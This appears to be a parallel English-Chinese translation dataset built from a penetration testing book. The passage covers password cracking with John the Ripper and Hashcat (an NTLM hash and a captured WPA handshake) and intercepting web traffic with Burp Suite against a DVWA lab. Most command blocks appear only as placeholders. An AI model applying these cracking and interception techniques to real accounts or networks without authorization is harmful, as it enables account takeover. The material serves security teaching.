  - PREF_UL
  type: TYPE_NORMAL
  zh: '**字典模式**：在此模式下，JTR使用字典和规则。我们可以使用配置文件中的规则（`john -w=dictionary.txt -rules hashes.txt`）以及特定文件中的规则（`john
    -w:dictionary.txt -rules=Rules.txt hashes.txt`）。'
- en: '**Incremental**: This is a bruteforce attack and not a straight style counter
    (that is not 1, 2, 3 ...), but it is based on rules. Rules are defined in the
    `*.chr` files. To run it in the incremental mode, use the command `john -i:Alpha
    hashes.txt`, where `Alpha` is a type.'
  id: totrans-366
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**增量模式**：这是一种暴力破解攻击，而不是简单的计数（即1, 2, 3 ...），而是基于规则的。规则定义在`*.chr`文件中。要以增量模式运行，请使用命令`john
    -i:Alpha hashes.txt`，其中`Alpha`是类型。'
- en: '**Builtin**: This is a bruteforce mode for the built-in set. For example, `john
    -i=uld8 -builtin = ld hashes.txt`, where `-i = uld8` indicates that it will use
    charset `uld` 8 characters long and `-builtin = ld` denotes that words are generated
    from a mixed set of letters and numbers.'
  id: totrans-367
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**内建模式**：这是一个内建集合的暴力破解模式。例如，`john -i=uld8 -builtin = ld hashes.txt`，其中`-i =
    uld8`表示它将使用字符集`uld`并生成8个字符长的单词，`-builtin = ld`表示生成的单词来自字母和数字的混合集。'
- en: '**External**: Here, words will be generated in accordance with the rules described
    in the appropriate section of the configuration file. For example, `john -e=Paralel01
    hashes.txt`.'
  id: totrans-368
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**外部模式**：在此模式下，单词将根据配置文件中相应部分的规则生成。例如，`john -e=Paralel01 hashes.txt`。'
- en: '**Mask**: This is an attack based on mask. For example, `john -mask=\u\l\l\d\d\d
    hashes.txt` means words will be like `Abc123`.'
  id: totrans-369
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**掩码模式**：这是一种基于掩码的攻击。例如，`john -mask=\u\l\l\d\d\d hashes.txt`意味着生成的词语将类似于`Abc123`。'
- en: You can choose the required mode in your own case as per your needs.
  id: totrans-370
  prefs: []
  type: TYPE_NORMAL
  zh: 根据您的需求，您可以选择适合您的模式。
- en: One of the important features of JTR is that it supports work sessions, so it
    is possible to run multiple instances of JTR and restore work after JTR stops.
  id: totrans-371
  prefs: []
  type: TYPE_NORMAL
  zh: JTR的一个重要特性是它支持工作会话，因此可以在JTR停止后恢复工作并运行多个JTR实例。
- en: 'For this, start JTR with the `-session=<SESSION NAME>` key:'
  id: totrans-372
  prefs: []
  type: TYPE_NORMAL
  zh: 为此，请使用`-session=<SESSION NAME>`关键字启动JTR：
- en: '[PRE50]'
  id: totrans-373
  prefs: []
  type: TYPE_PRE
  zh: '[PRE50]'
- en: 'Restore it with the following command:'
  id: totrans-374
  prefs: []
  type: TYPE_NORMAL
  zh: 使用以下命令恢复它：
- en: '[PRE51]'
  id: totrans-375
  prefs: []
  type: TYPE_PRE
  zh: '[PRE51]'
- en: Example
  id: totrans-376
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 示例
- en: Previously, when working with the Metasploit Framework, we have received hashes
    of local user passwords. Let's try to carry out an attack on a hash to restore
    a password using JTR.
  id: totrans-377
  prefs: []
  type: TYPE_NORMAL
  zh: 之前在使用Metasploit框架时，我们已获得本地用户密码的哈希。现在让我们尝试使用JTR对哈希进行攻击以恢复密码。
- en: 'For this, first of all, let''s put the hash string of user John to a separate
    file:'
  id: totrans-378
  prefs: []
  type: TYPE_NORMAL
  zh: 为此，首先将用户John的哈希字符串放入单独的文件中：
- en: '[PRE52]'
  id: totrans-379
  prefs: []
  type: TYPE_PRE
  zh: '[PRE52]'
- en: 'Execute JTR on this file:'
  id: totrans-380
  prefs: []
  type: TYPE_NORMAL
  zh: 在该文件上执行JTR：
- en: '[PRE53]'
  id: totrans-381
  prefs: []
  type: TYPE_PRE
  zh: '[PRE53]'
- en: In the sixth line of output, we can see our password `12345678`. So, in our
    case, the password was weak and JTR restores it quickly.
  id: totrans-382
  prefs: []
  type: TYPE_NORMAL
  zh: 在输出的第六行中，我们可以看到我们的密码`12345678`。因此，在我们的案例中，密码较弱，JTR很快就恢复了它。
- en: Hashcat
  id: totrans-383
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Hashcat
- en: Hashcat is a multifunctional tool for restoring passwords from their hashes.
    Hashcat became so popular thanks to the support of the vast number of algorithms
    of hashing data, speed of work, and ease of configuring and use.
  id: totrans-384
  prefs: []
  type: TYPE_NORMAL
  zh: Hashcat是一个多功能工具，用于从哈希值恢复密码。Hashcat因其支持大量的哈希算法、较快的工作速度以及便捷的配置和使用方式而广受欢迎。
- en: 'Hashcat has the following benefits:'
  id: totrans-385
  prefs: []
  type: TYPE_NORMAL
  zh: Hashcat的优点：
- en: Multithreaded
  id: totrans-386
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 多线程
- en: Open source
  id: totrans-387
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 开源
- en: Cross platform (Linux, Windows, and OS X)
  id: totrans-388
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 跨平台（Linux、Windows和OS X）
- en: More than 90 hashing algorithms (MD5, SHA1, NTLM, MySQL, WPA, and so on)
  id: totrans-389
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 超过90种哈希算法（MD5、SHA1、NTLM、MySQL、WPA等）
- en: Expandable attack modes
  id: totrans-390
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 可扩展的攻击模式
- en: JTR compatible
  id: totrans-391
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 兼容JTR
- en: Wide set of settings
  id: totrans-392
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 广泛的设置选项
- en: But the most important feature is the ability to work on graphical processors,
    which gives a significant boost in speed compared to the work of the CPU.
  id: totrans-393
  prefs: []
  type: TYPE_NORMAL
  zh: 但最重要的特点是它能够在图形处理器上工作，相较于CPU的运算速度，提供了显著的加速。
- en: 'You can get Hashcat from the official website ([http://hashcat.net](http://hashcat.net)).
    In most popular Linux distributions, it is available in their repositories. For
    example, in Debian, you can use the following command:'
  id: totrans-394
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以从Hashcat的官方网站（[http://hashcat.net](http://hashcat.net)）获取Hashcat。在大多数流行的Linux发行版中，它可以在其软件仓库中找到。例如，在Debian中，你可以使用以下命令：
- en: '[PRE54]'
  id: totrans-395
  prefs: []
  type: TYPE_PRE
  zh: '[PRE54]'
- en: 'Hashcat contains many executable files with different prefixes and postfixes:
    `hashcat`, `oclHashcat`, `oclHashcat-plus`, `oclHashcat-lite`, and `cudaHashcat`.
    Each executable file performs its task, so you should choose one depending on
    your requirements.'
  id: totrans-396
  prefs: []
  type: TYPE_NORMAL
  zh: Hashcat包含多个带有不同前缀和后缀的可执行文件：`hashcat`、`oclHashcat`、`oclHashcat-plus`、`oclHashcat-lite`和`cudaHashcat`。每个可执行文件执行特定的任务，因此你应根据需求选择合适的文件。
- en: '`./hashcat`: This is the main program that uses the CPU. It is slow, but it
    supports the largest number of hashing algorithms.'
  id: totrans-397
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`./hashcat`：这是使用CPU的主程序。它较慢，但支持最多的哈希算法。'
- en: 'Prefix `ocl` (`oclHashcat`): It uses the GPU of ATI. It supports a limited
    amount of hashing algorithms and it has built-in support for dictionary attacks,
    mask attacks, and bruteforce attacks.'
  id: totrans-398
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 前缀`ocl`（`oclHashcat`）：它使用ATI的GPU。它支持有限数量的哈希算法，并内置支持字典攻击、掩码攻击和暴力破解攻击。
- en: 'Prefix `cuda` (`cudaHashcat`): It is like prefix `ocl`, but it uses the GPU
    of NVIDIA.'
  id: totrans-399
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 前缀`cuda`（`cudaHashcat`）：它类似于前缀`ocl`，但使用NVIDIA的GPU。
- en: 'Postfix `plus` (`oclHashcat-plus`): It supports the largest number of hashing
    algorithms from all Hashcat(s) using GPU. It is optimized for dictionary attacks
    for many hashes.'
  id: totrans-400
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 后缀`plus`（`oclHashcat-plus`）：它支持所有使用GPU的Hashcat中最多的哈希算法。它针对许多哈希的字典攻击进行了优化。
- en: 'Postfix `lite` (`oclHashcat-lite`): It is optimized for a single hash attack.
    The fastest executable Hashcat, but it supports a minimum number of hashing algorithms.'
  id: totrans-401
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 后缀`lite`（`oclHashcat-lite`）：它针对单一哈希攻击进行了优化，是Hashcat中运行速度最快的可执行文件，但支持的哈希算法最少。
- en: It should be noted that for `cuda` and `ocl` versions of Hashcat, we need to
    install appropriate proprietary drivers that support the conduct of GPU computing.
  id: totrans-402
  prefs: []
  type: TYPE_NORMAL
  zh: 应注意，对于`cuda`和`ocl`版本的Hashcat，我们需要安装支持GPU计算的适当专有驱动程序。
- en: 'Hashcat is executed with the following syntax:'
  id: totrans-403
  prefs: []
  type: TYPE_NORMAL
  zh: Hashcat的执行语法如下：
- en: '`hashcat [options] hashfile [mask|wordfiles|directories]`'
  id: totrans-404
  prefs: []
  type: TYPE_NORMAL
  zh: '`hashcat [options] hashfile [mask|wordfiles|directories]`'
- en: 'Here:'
  id: totrans-405
  prefs: []
  type: TYPE_NORMAL
  zh: 这里：
- en: '`options`: These are parameters such as attack mode, hash type, rules and others'
  id: totrans-406
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`options`：这些是攻击模式、哈希类型、规则等参数'
- en: '`hashfile`: This is the file on the local filesystem that contains the target
    hash'
  id: totrans-407
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`hashfile`：这是本地文件系统中包含目标哈希的文件'
- en: '`mask|wordfiles|directories`: This is the source of passwords'
  id: totrans-408
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`mask|wordfiles|directories`：这是密码的来源'
- en: 'You can get the full list of Hashcat parameters by executing the `help` command:'
  id: totrans-409
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以通过执行`help`命令获取Hashcat的完整参数列表：
- en: '[PRE55]'
  id: totrans-410
  prefs: []
  type: TYPE_PRE
  zh: '[PRE55]'
- en: 'For example, for speed benchmarking, we can use the `-b` key:'
  id: totrans-411
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，进行速度基准测试时，我们可以使用`-b`键：
- en: '[PRE56]'
  id: totrans-412
  prefs: []
  type: TYPE_PRE
  zh: '[PRE56]'
- en: Example
  id: totrans-413
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 示例
- en: Let's repeat the restore procedure for the password of user John, as we did
    in the case of JTR, but using Hashcat. As in the case of JTR, first we need to
    put hash into a separate file, but the requirements of Hashcat are a little different.
    From the obtained hash string `John:1001:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::`,
    we need get only the NT part of the NTLM hash. It is the fourth field separated
    by a colon character hash string, that is, `259745cb123a52aa2e693aaacca2db52`.
  id: totrans-414
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们重复恢复用户John的密码的过程，就像我们在使用JTR时做的那样，但这次使用Hashcat。与JTR相似，首先我们需要将哈希放入一个单独的文件，但Hashcat的要求稍有不同。从获得的哈希字符串`John:1001:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::`中，我们只需要获取NTLM哈希的NT部分。它是由冒号字符分隔的第四个字段哈希字符串，即`259745cb123a52aa2e693aaacca2db52`。
- en: '[PRE57]'
  id: totrans-415
  prefs: []
  type: TYPE_PRE
  zh: '[PRE57]'
- en: 'And execute Hashcat on this file:'
  id: totrans-416
  prefs: []
  type: TYPE_NORMAL
  zh: 然后在这个文件上执行Hashcat：
- en: '[PRE58]'
  id: totrans-417
  prefs: []
  type: TYPE_PRE
  zh: '[PRE58]'
- en: 'Here:'
  id: totrans-418
  prefs: []
  type: TYPE_NORMAL
  zh: 这里：
- en: '`-m 1000`: This points out that this is a NTLM hash'
  id: totrans-419
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-m 1000`：这表示这是一个NTLM哈希'
- en: '`hashdump.hc`: This is the file that contains the hash'
  id: totrans-420
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`hashdump.hc`：这是包含哈希的文件'
- en: '`passwords.list`: This is the dictionary file with passwords for iterating;
    in our case (for testing purposes), it contains the correct password for our hash'
  id: totrans-421
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`passwords.list`：这是包含密码的字典文件，用于迭代；在我们的案例中（为了测试目的），它包含了我们哈希的正确密码'
- en: 'The output of the executed command will be like this:'
  id: totrans-422
  prefs: []
  type: TYPE_NORMAL
  zh: 执行命令的输出如下：
- en: '[PRE59]'
  id: totrans-423
  prefs: []
  type: TYPE_PRE
  zh: '[PRE59]'
- en: The output is informative enough and we can see our recovered password.
  id: totrans-424
  prefs: []
  type: TYPE_NORMAL
  zh: 输出信息足够详尽，我们可以看到恢复的密码。
- en: Now, let's try to crack the WPA handshake which we obtained when we met with
    `aircrack-ng`. We have the WPA handshake in the `guest_dump-01.cap` file. Before
    we get started with Hashcat, we need to format the handshake in an acceptable
    form for Hashcat.
  id: totrans-425
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们尝试破解我们在使用`aircrack-ng`时获得的WPA握手。我们有WPA握手保存在`guest_dump-01.cap`文件中。在我们开始使用Hashcat之前，我们需要将握手格式化为Hashcat可以接受的形式。
- en: 'For this purpose, first we need to clean the `*.cap` file:'
  id: totrans-426
  prefs: []
  type: TYPE_NORMAL
  zh: 为此目的，首先我们需要清理`*.cap`文件：
- en: '[PRE60]'
  id: totrans-427
  prefs: []
  type: TYPE_PRE
  zh: '[PRE60]'
- en: 'The output is as follows:'
  id: totrans-428
  prefs: []
  type: TYPE_NORMAL
  zh: 输出如下：
- en: '[PRE61]'
  id: totrans-429
  prefs: []
  type: TYPE_PRE
  zh: '[PRE61]'
- en: Here
  id: totrans-430
  prefs: []
  type: TYPE_NORMAL
  zh: 这里
- en: '`clear.cap`: This is the name of new cap-file'
  id: totrans-431
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`clear.cap`：这是新CAP文件的名称'
- en: '`guest_dump-01.cap`: This is the file that contained our handshake'
  id: totrans-432
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`guest_dump-01.cap`：这是包含我们握手信息的文件'
- en: 'Then, we need to convert the CAP file into a Hashcat format CAP file (`.hccap`).
    To do this, use the `aircrack-ng` command with the `-J` key:'
  id: totrans-433
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，我们需要将CAP文件转换为Hashcat格式的CAP文件（`.hccap`）。为此，请使用`aircrack-ng`命令并带上`-J`键：
- en: '[PRE62]'
  id: totrans-434
  prefs: []
  type: TYPE_PRE
  zh: '[PRE62]'
- en: 'The output is as follows:'
  id: totrans-435
  prefs: []
  type: TYPE_NORMAL
  zh: 输出如下：
- en: '[PRE63]'
  id: totrans-436
  prefs: []
  type: TYPE_PRE
  zh: '[PRE63]'
- en: As a result, we get the `output_file.hccap` file. Please note that the used
    *J* is in uppercase.
  id: totrans-437
  prefs: []
  type: TYPE_NORMAL
  zh: 结果，我们得到`output_file.hccap`文件。请注意，使用的*J*是大写的。
- en: 'Now, we can execute Hashcat with the following command:'
  id: totrans-438
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们可以执行Hashcat命令如下：
- en: '[PRE64]'
  id: totrans-439
  prefs: []
  type: TYPE_PRE
  zh: '[PRE64]'
- en: 'Here:'
  id: totrans-440
  prefs: []
  type: TYPE_NORMAL
  zh: 这里：
- en: '`--force`: This ignores warnings'
  id: totrans-441
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`--force`：此选项忽略警告'
- en: '`-m 2500`: The hash type is WPA/WPA2'
  id: totrans-442
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-m 2500`：哈希类型是WPA/WPA2'
- en: '`--session=session05`: This is the name of the session (for possible continuation)'
  id: totrans-443
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`--session=session05`：这是会话名称（用于可能的继续）'
- en: 'The output is as follows:'
  id: totrans-444
  prefs: []
  type: TYPE_NORMAL
  zh: 输出如下：
- en: '[PRE65]'
  id: totrans-445
  prefs: []
  type: TYPE_PRE
  zh: '[PRE65]'
- en: In this case, the text of the password was `Test!!!800`. At the beginning of
    the output, you can see which GPU is supported by the program. If you have multiple
    GPUs, even if they are not united, the software will detect them automatically.
    If the GPU is not found, you will have to check whether the proprietary drivers
    and additional libraries are installed.
  id: totrans-446
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，密码文本是`Test!!!800`。在输出的开始部分，你可以看到程序支持的GPU。如果你有多个GPU，即使它们没有合并，软件也会自动检测到它们。如果没有找到GPU，你需要检查是否已安装专有驱动程序和附加库。
- en: Web application hacking tools
  id: totrans-447
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Web应用程序攻击工具
- en: Needless to say, with every new day web applications play a bigger role in the
    life of the modern Internet than they have ever played before and their security
    stays among the most important and complicated tasks for various companies.
  id: totrans-448
  prefs: []
  type: TYPE_NORMAL
  zh: 不用多说，随着每一天的过去，Web应用程序在现代互联网生活中的作用比以往任何时候都更加重要，而它们的安全性仍然是各种公司面临的最重要和最复杂的任务之一。
- en: Most of them are custom written proprietary applications developed without proper
    application security management processes in place and often without security
    considerations and controls. That is why probably the most demanded penetration
    testing service nowadays is web application security analysis and we are going
    to review the most popular tool used by web hackers and pentesters.
  id: totrans-449
  prefs: []
  type: TYPE_NORMAL
  zh: 其中大部分是没有适当应用安全管理流程、并且通常没有考虑安全性和控制的定制专有应用程序。因此，可能当前最受需求的渗透测试服务是Web应用程序安全分析，我们将回顾Web黑客和渗透测试人员使用的最流行工具。
- en: Burp Suite
  id: totrans-450
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Burp Suite
- en: Burp Suite is a tool of the class called intercepting or attacking proxy, which
    allows its users to inspect and manipulate web traffic passing through it.
  id: totrans-451
  prefs: []
  type: TYPE_NORMAL
  zh: Burp Suite 是一种称为拦截或攻击代理的工具，它允许用户检查和操作通过它的网络流量。
- en: There are other free and non-free intercepting (attack) proxies available. However,
    the authors of this book got used to and stuck to Burp Suite, and that is why
    we are going to describe this framework.
  id: totrans-452
  prefs: []
  type: TYPE_NORMAL
  zh: 还有其他免费的和非免费的拦截（攻击）代理可供选择。然而，本书的作者习惯并坚持使用 Burp Suite，因此我们将详细描述这个框架。
- en: Note
  id: totrans-453
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: The main functions and capabilities of various attack proxies are the same (or
    at least, very similar), so you can treat the following Burp Suite review more
    or less as a review of the whole class of tools, rather than a certain software.
  id: totrans-454
  prefs: []
  type: TYPE_NORMAL
  zh: 各种攻击代理的主要功能和能力是相同的（或者至少非常相似），因此你可以将以下的 Burp Suite 评测视为对整个工具类别的评测，而不仅仅是对某个特定软件的评测。
- en: You can find comparisons of various attack proxies using Google search and choose
    the one that fits your needs best and is the most comfortable for you personally
    to work with.
  id: totrans-455
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以使用谷歌搜索找到各种攻击代理的对比，选择最适合你需求的，并且是你个人工作中最舒适的工具。
- en: 'The other alternative intercepting proxies that are worth trying could be:'
  id: totrans-456
  prefs: []
  type: TYPE_NORMAL
  zh: 其他值得尝试的拦截代理替代品可能是：
- en: OWASP **Zed attack proxy** (**ZAP**)
  id: totrans-457
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: OWASP **Zed attack proxy** (**ZAP**)
- en: OWASP WebScarab
  id: totrans-458
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: OWASP WebScarab
- en: Watobo
  id: totrans-459
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Watobo
- en: Burp Suite is a cross-platform Java framework with various tools combined in
    one GUI, which works under any OS with appropriate Java software installed. One
    of the main advantages of the Burp Suit is its extensibility through a special
    API and numerous extensions.
  id: totrans-460
  prefs: []
  type: TYPE_NORMAL
  zh: Burp Suite 是一个跨平台的 Java 框架，包含多种工具集成在一个图形界面中，能够在任何安装了适当 Java 软件的操作系统上运行。Burp
    Suite 的主要优势之一是通过特殊 API 和众多扩展的可扩展性。
- en: 'There are two variants of Burp Suite available on the official website ([https://portswigger.net/burp/](https://portswigger.net/burp/)):
    free and Pro versions.'
  id: totrans-461
  prefs: []
  type: TYPE_NORMAL
  zh: 官方网站（[https://portswigger.net/burp/](https://portswigger.net/burp/)）提供了两个版本的
    Burp Suite：免费版和专业版。
- en: 'The free version contains the same tools as the Pro version, but with limited
    capabilities and less automation. Those tools are:'
  id: totrans-462
  prefs: []
  type: TYPE_NORMAL
  zh: 免费版包含与专业版相同的工具，但功能有限且自动化程度较低。那些工具包括：
- en: '**Intercepting proxy**: This allows you to review and modify web traffic'
  id: totrans-463
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Intercepting proxy**：这允许你查看和修改网络流量。'
- en: '**Information aggregation tool**: This represents gathered information about
    targets in a convenient way'
  id: totrans-464
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Information aggregation tool**：这以便捷的方式展示收集的关于目标的信息。'
- en: '**Spider**: Spiders inspects all links and pages of target web resources to
    determine their structures and pass this information to the aggregation tool'
  id: totrans-465
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Spider**：蜘蛛程序检查目标网络资源的所有链接和页面，以确定它们的结构，并将这些信息传递给聚合工具。'
- en: '**Repeater**: This allows us to send customized requests and analyze responses'
  id: totrans-466
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Repeater**：这允许我们发送自定义请求并分析响应。'
- en: '**Intruder**: This is the attack automation and customization tool'
  id: totrans-467
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Intruder**：这是攻击自动化和自定义工具。'
- en: '**Decoder**: This is helpful to encode-decode character blocks'
  id: totrans-468
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Decoder**：这是一个有助于编码和解码字符块的工具。'
- en: '**Sequencer**: This analyzes the entropy of various tokens'
  id: totrans-469
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Sequencer**：这个工具分析各种令牌的熵值。'
- en: '**Comparer**: This compares requests and responses in a convenient way'
  id: totrans-470
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Comparer**：这可以方便地比较请求和响应。'
- en: '**Extender**: This allows installation and management of numerous Burp extensions'
  id: totrans-471
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Extender**：这允许安装和管理众多 Burp 扩展。'
- en: 'When talking about the most significant distinctions between the free and Pro
    versions, the Pro version also allows the following:'
  id: totrans-472
  prefs: []
  type: TYPE_NORMAL
  zh: 在谈论免费版与专业版之间的最显著区别时，专业版还提供以下功能：
- en: Carrying out passive security analysis of web traffic and active web vulnerability
    scans using the Scanner tool
  id: totrans-473
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用扫描工具进行被动安全分析和主动网页漏洞扫描。
- en: Saving and restoring framework state including all requests and responses (especially
    useful for big projects)
  id: totrans-474
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 保存和恢复框架状态，包括所有请求和响应（对于大项目尤其有用）。
- en: Using various built-in attack payloads for automated attacks with the Intruder
    tool
  id: totrans-475
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用 Intruder 工具进行自动攻击时，使用各种内置的攻击负载。
- en: Performing search and various analysis types of targets and captured web traffic
  id: totrans-476
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 执行目标和捕获的网络流量的搜索和各种分析类型。
- en: Taking advantage of a better performance in the Intruder tool
  id: totrans-477
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 利用 Intruder 工具中更好的性能。
- en: Installing some extensions available only for the Pro version
  id: totrans-478
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 安装仅限于专业版的某些扩展。
- en: Example
  id: totrans-479
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 示例
- en: After introducing Burp Suite, we would like to show you an example of a sample
    web application testing. Let's work with DVWA in our lab environment. We assume
    that you have already downloaded and started a free version on an attacking machine.
  id: totrans-480
  prefs: []
  type: TYPE_NORMAL
  zh: 在介绍了 Burp Suite 后，我们希望向你展示一个示例，进行一个 Web 应用程序的测试。让我们在实验环境中使用 DVWA。我们假设你已经在攻击机器上下载并启动了免费版本。
- en: Note
  id: totrans-481
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: Another useful tool for web pentesting is a **proxy switching browser extension**.
    Since most of the web application testing activities are done in a browser, it
    is not very convenient to always change browser or OS settings when you need to
    switch between proxies or turn off passing traffic through a proxy at all. The
    better and faster way is to have a button on a toolbar provided by special browser
    extensions. We use the FoxyProxy extension for Mozilla Firefox and Google Chrome
    browsers.
  id: totrans-482
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个对 Web 渗透测试有用的工具是 **代理切换浏览器扩展**。由于大多数 Web 应用程序测试活动都是在浏览器中进行的，每次切换代理或完全关闭代理时都需要更改浏览器或操作系统设置，这并不方便。更好的方法是通过专用的浏览器扩展提供工具栏上的按钮。我们使用
    Mozilla Firefox 和 Google Chrome 浏览器的 FoxyProxy 扩展。
- en: 'Let''s start with the example:'
  id: totrans-483
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们从这个示例开始：
- en: Start the DVWA VM and set the appropriate network interface settings according
    to the way your attacking machine is connected to the lab environment (in our
    case, we don't start the whole lab network but just start the DVWA VM with an
    interface in host-only mode and attack it from the host machine).
  id: totrans-484
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 启动 DVWA 虚拟机，并根据你的攻击机器如何连接到实验环境来设置适当的网络接口设置（在我们的案例中，我们并没有启动整个实验网络，而只是启动 DVWA
    虚拟机，并将接口设置为仅主机模式，从主机机器进行攻击）。
- en: Start Burp Suite, go to **Proxy** | **Options**, and check if there is an activated
    proxy listener on `localhost:8080` (activate it if not). It should look like this:![Example](../images/00063.jpeg)
  id: totrans-485
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 启动 Burp Suite，进入 **Proxy** | **Options**，检查是否有激活的代理监听器在 `localhost:8080`（如果没有，请激活它）。它应该像这样显示：![示例](../images/00063.jpeg)
- en: Go to the **Proxy** | **Intercept** tab and check whether the **Intercept**
    button is selected. It will intercept web requests instead of just recording them.
  id: totrans-486
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 转到 **Proxy** | **Intercept** 标签页，检查 **Intercept** 按钮是否已选择。它将拦截网络请求，而不仅仅是记录它们。
- en: Configure a local proxy on port 8080 in your browser or create and activate
    it in the FoxyProxy browser extension:![Example](../images/00064.jpeg)
  id: totrans-487
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在浏览器中配置一个本地代理，端口为 8080，或者在 FoxyProxy 浏览器扩展中创建并激活它：![示例](../images/00064.jpeg)
- en: Open DVWA in browser with the `http://10.0.0.5/DVWA` link and you will see the
    request in Burp:![Example](../images/00065.jpeg)
  id: totrans-488
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用 `http://10.0.0.5/DVWA` 链接在浏览器中打开 DVWA，你将在 Burp 中看到请求：![示例](../images/00065.jpeg)
- en: Just inspect the request and turn interception off. It will allow to forward
    the next request to its target and not intercept the following requests.
  id: totrans-489
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 只需检查请求并关闭拦截。这将允许将下一个请求转发到目标，并且不会拦截后续请求。
- en: Log in to the application in the browser, switch to the **Proxy** | **HTTP History**
    tab in Burp, find the initial request to DVWA in the list, right-click on it,
    and click on **Add** to scope in the context menu.
  id: totrans-490
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在浏览器中登录应用程序，切换到 Burp 中的 **Proxy** | **HTTP History** 标签页，找到列表中的初始请求到 DVWA，右键点击它，并在上下文菜单中点击
    **Add** 将其添加到范围。
- en: Go to the **Target** tab. Here, you will see domains and hosts (targets) that
    your browser has requested since you have started intercept. On the **Target**
    | **Scope** tab, you will see which targets are currently added to the scope of
    your security assessment. Check whether `10.0.0.5/dvwa/` is among them.
  id: totrans-491
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 转到 **Target** 标签页。在这里，你将看到自从你开始拦截以来，浏览器请求的域名和主机（目标）。在 **Target** | **Scope**
    标签中，你将看到当前已添加到安全评估范围内的目标。检查 `10.0.0.5/dvwa/` 是否在其中。
- en: Now, you can make Burp hide everything that is not in the scope. It will still
    capture all web traffic, but it will not bother you by displaying it. To hide
    everything not in scope, just click on the filter line under tab menu and select
    the **Show only in-scope items** checkbox:![Example](../images/00066.jpeg)
  id: totrans-492
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，你可以让 Burp 隐藏所有不在范围内的内容。它仍然会捕获所有的网络流量，但不会通过显示它来打扰你。要隐藏不在范围内的所有内容，只需点击标签菜单下的过滤线，并勾选
    **仅显示在范围内的项目** 复选框：![示例](../images/00066.jpeg)
- en: Do the same for the **Proxy** | **HTTP history** tab.
  id: totrans-493
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 对 **Proxy** | **HTTP history** 标签页做同样的操作。
